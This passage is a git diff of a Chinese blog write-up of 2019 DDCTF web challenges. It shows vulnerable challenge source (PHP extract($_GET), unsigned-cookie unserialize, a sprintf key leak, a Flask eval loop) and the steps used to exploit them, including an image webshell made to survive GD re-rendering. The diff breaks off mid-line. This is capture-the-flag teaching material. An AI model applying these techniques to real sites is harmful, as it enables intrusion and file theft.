@@ -85,13 +85,13 @@ Python的Flask简单学习：https://blog.csdn.,">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    64k
+                    35k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    58 mins.
+                    32 mins.
                 </span>
                 
                 
@@ -150,17 +150,37 @@ Python的Flask简单学习：https://blog.csdn.,">
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-7.png" alt="1-7"></p>
 <p>注意到这里有一个<code>感叹号</code>，并且这个php文件对我们可能有用，要去获取它的内容</p>
 <p>但是之前的正则匹配过滤掉除了<code>a-z、A-Z、0-9</code>的所有字符：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
+</code></pre>
 <p>但是他自身的规则又会将<code>config</code>替换成<code>!</code>：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-8.png" alt="1-8"></p>
 <p>就利用这个规则，将<code>f1ag!ddctf.php</code>改成<code>f1agconfigddctf.php</code>，加密后传入，得到新的内容</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-9.png" alt="1-9"></p>
 <p>拿去解密得到：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+include(&#39;config.php&#39;);
+$k = &#39;hello&#39;;
+extract($_GET);
+if(isset($uid))
+{
+    $content=trim(file_get_contents($k));
+    if($uid==$content)
+    {
+        echo $flag;
+    }
+    else
+    {
+        echo&#39;hello&#39;;
+    }
+}
+
+?&gt;
+</code></pre>
 <p>那么，<code>file_get_contents(hello)</code>是不是有任何返回的，所有<code>uid=</code>直接不添加参数，<code>url如下</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=</span><br></pre></td></tr></table></figure>
-<p>直接拿到flag</p>
+<pre><code>http://117.51.150.246/f1ag!ddctf.php?uid=
+</code></pre><p>直接拿到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-10.png" alt="1-10"></p>
 <h2 id="第二题（WEB签到题）"><a href="#第二题（WEB签到题）" class="headerlink" title="第二题（WEB签到题）"></a>第二题（WEB签到题）</h2><p>访问链接，提示<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-1.png" alt="2-1"></p>
@@ -174,7 +194,166 @@ Python的Flask简单学习：https://blog.csdn.,">
 <p>按照提示访问<code>app\/fL2XID2i0Cdh.php</code>，得到源代码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-5.png" alt="2-5"></p>
 <p>接下来就是代码审计了：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url:app/Application.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url:app/Session.php</span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure>
+<pre><code class="php">url:app/Application.php
+
+
+Class Application {
+    var $path = &#39;&#39;;
+
+
+    public function response($data, $errMsg = &#39;success&#39;) {
+        $ret = [&#39;errMsg&#39; =&gt; $errMsg,
+            &#39;data&#39; =&gt; $data];
+        $ret = json_encode($ret);
+        header(&#39;Content-type: application/json&#39;);
+        echo $ret;
+
+    }
+
+    public function auth() {
+        $DIDICTF_ADMIN = &#39;admin&#39;;
+        if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
+            $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
+            return TRUE;
+        }else{
+            $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
+            exit();
+        }
+
+    }
+    private function sanitizepath($path) {
+    $path = trim($path);
+    $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);
+    $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);
+    return $path;
+}
+
+public function __destruct() {
+    if(empty($this-&gt;path)) {
+        exit();
+    }else{
+        $path = $this-&gt;sanitizepath($this-&gt;path);
+        if(strlen($path) !== 18) {
+            exit();
+        }
+        $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
+    }
+    exit();
+}
+}
+
+url:app/Session.php
+include &#39;Application.php&#39;;
+class Session extends Application {
+
+    //key建议为8位字符串
+    var $eancrykey                  = &#39;&#39;;
+    var $cookie_expiration            = 7200;
+    var $cookie_name                = &#39;ddctf_id&#39;;
+    var $cookie_path                = &#39;&#39;;
+    var $cookie_domain                = &#39;&#39;;
+    var $cookie_secure                = FALSE;
+    var $activity                   = &quot;DiDiCTF&quot;;
+
+    public function index()
+    {
+    if(parent::auth()) {
+            $this-&gt;get_key();
+            if($this-&gt;session_read()) {
+                $data = &#39;DiDI Welcome you %s&#39;;
+                $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
+                parent::response($data,&#39;sucess&#39;);
+            }else{
+                $this-&gt;session_create();
+                $data = &#39;DiDI Welcome you&#39;;
+                parent::response($data,&#39;sucess&#39;);
+            }
+        }
+
+    }
+
+    private function get_key() {
+        //eancrykey  and flag under the folder
+        $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
+    }
+
+    public function session_read() {
+        if(empty($_COOKIE)) {
+        return FALSE;
+        }
+
+        $session = $_COOKIE[$this-&gt;cookie_name];
+        if(!isset($session)) {
+            parent::response(&quot;session not found&quot;,&#39;error&#39;);
+            return FALSE;
+        }
+        $hash = substr($session,strlen($session)-32);
+        $session = substr($session,0,strlen($session)-32);
+
+        if($hash !== md5($this-&gt;eancrykey.$session)) {
+            parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;);
+            return FALSE;
+        }
+        $session = unserialize($session);
+
+
+        if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
+            return FALSE;
+        }
+
+        if(!empty($_POST[&quot;nickname&quot;])) {
+            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
+            $data = &quot;Welcome my friend %s&quot;;
+            foreach ($arr as $k =&gt; $v) {
+                $data = sprintf($data,$v);
+            }
+            parent::response($data,&quot;Welcome&quot;);
+        }
+
+        if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
+            parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
+            return FALSE;
+        }
+        if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
+            parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
+            return FALSE;
+        }
+        return TRUE;
+
+    }
+
+    private function session_create() {
+        $sessionid = &#39;&#39;;
+        while(strlen($sessionid) &lt; 32) {
+            $sessionid .= mt_rand(0,mt_getrandmax());
+        }
+
+        $userdata = array(
+            &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
+            &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
+            &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
+            &#39;user_data&#39; =&gt; &#39;&#39;,
+        );
+
+        $cookiedata = serialize($userdata);
+        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
+        $expire = $this-&gt;cookie_expiration + time();
+        setcookie(
+            $this-&gt;cookie_name,
+            $cookiedata,
+            $expire,
+            $this-&gt;cookie_path,
+            $this-&gt;cookie_domain,
+            $this-&gt;cookie_secure
+            );
+
+    }
+}
+
+
+$ddctf = new Session();
+$ddctf-&gt;index();
+</code></pre>
 <p>首先创建了一个<code>Session类</code>（Session类继承了Application类），调用了该类的<code>index()</code>方法</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-6.png" alt="2-6"></p>
 <p>看一下<code>index()</code>这个方法，调用了<code>parent::auth()</code>，也就是<code>Application类的auth()方法</code></p>
@@ -203,8 +382,8 @@ Python的Flask简单学习：https://blog.csdn.,">
 <p><code>url解码</code>一下</p>
 <p>的确是我们之前的：（$userdata的序列化）+（$userdata的序列化+eancrykey的md5的值）</p>
 <p>直接将后面的md5值拿去在线网站解密一下，没有结果，那就继续吧</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;598fd9af879fcff5e6f1fd754cc731d9&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;140.224.71.170&quot;;s:10:&quot;user_agent&quot;;s:113:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;77892297db0f81fbbfcf6d269731b568</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-15.png" alt="2-15"></p>
+<pre><code>a:4:{s:10:&quot;session_id&quot;;s:32:&quot;598fd9af879fcff5e6f1fd754cc731d9&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;140.224.71.170&quot;;s:10:&quot;user_agent&quot;;s:113:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}77892297db0f81fbbfcf6d269731b568
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-15.png" alt="2-15"></p>
 <p>此时我们的<code>Cookie和Session</code>是已经创建好了的，可以成功执行到<code>session_read()</code>方法，方法内：</p>
 <p>一直到这一步，需要我们<code>POST</code>一个值</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-16.png" alt="2-16"></p>
@@ -231,8 +410,8 @@ Python的Flask简单学习：https://blog.csdn.,">
 <p>我们在图片中插入phpinfo，上传之后再现在网页上我们上传的图片，会发现我们插入的phpinfo不见了。猜测后端应该是使用了PHP-GD拓展处理了图片。我们绕过GD拓展，使得图片里面包含phpinfo即可，具体看第一篇参考文章</p>
 <p>绕过二次渲染上传图片马：看第二篇参考文章</p>
 <p>使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-2.png" alt="3-2"></p>
+<pre><code>php jpg_payload.php 1.jpg
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-2.png" alt="3-2"></p>
 <p> 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证：</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/3-3.png" alt="3-3"></p>
 <p>成功插入phpinfo信息，再次在服务器中上传该图片马</p>
@@ -243,12 +422,191 @@ Python的Flask简单学习：https://blog.csdn.,">
 <h2 id="第四题（homebrew-event-loop）"><a href="#第四题（homebrew-event-loop）" class="headerlink" title="第四题（homebrew event loop）"></a>第四题（homebrew event loop）</h2><p>链接进去</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/4-1.png" alt="4-1"></p>
 <p>点击<code>View source code</code>查看源代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># written in python 2.7 </span></span><br><span class="line">__author__ = <span class="string">'garzon'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored </span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored </span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span> </span><br><span class="line">    session[<span class="string">'log'</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:] </span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]): </span><br><span class="line">        request.event_queue += event </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        request.event_queue.append(event) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span> </span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):] </span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] </span><br><span class="line">    <span class="keyword">return</span> haystack </span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span> </span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>) </span><br><span class="line">    resp = <span class="literal">None</span> </span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>: </span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:] </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span> </span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>) </span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>) </span><br><span class="line">            <span class="keyword">try</span>: </span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>)) </span><br><span class="line">                ret_val = event_handler(args) </span><br><span class="line">            <span class="keyword">except</span> RollBackException: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span> </span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>] </span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>] </span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">except</span> Exception, e: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging </span></span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val </span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val </span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>) </span><br><span class="line">    session.modified = <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">return</span> resp </span><br><span class="line">     </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 